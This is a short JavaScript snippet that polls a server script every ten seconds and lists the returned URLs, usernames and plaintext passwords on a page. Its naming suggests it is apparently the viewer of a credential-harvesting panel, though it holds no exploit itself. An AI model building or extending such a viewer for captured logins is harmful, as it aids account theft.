function Get_data(){
    $.post("handler/loginc/checker.php",{"data":"Send_Me_Data"},function(data){

    if(data == "Data isn't Exist :/"){
        console.log("🤔")
    }else{
        $("#result_listener").text("")
        obj = JSON.parse(data)

        for(i of obj){
            $("#result_listener").append("url : "+i['url'])
            $("#result_listener").append("\nusername : "+i['username'])
            $("#result_listener").append("\npassword : "+i['password'])
            $("#result_listener").append("\n--------------------------------\n")
        }
        
    }


    })

}


setInterval(Get_data,10000)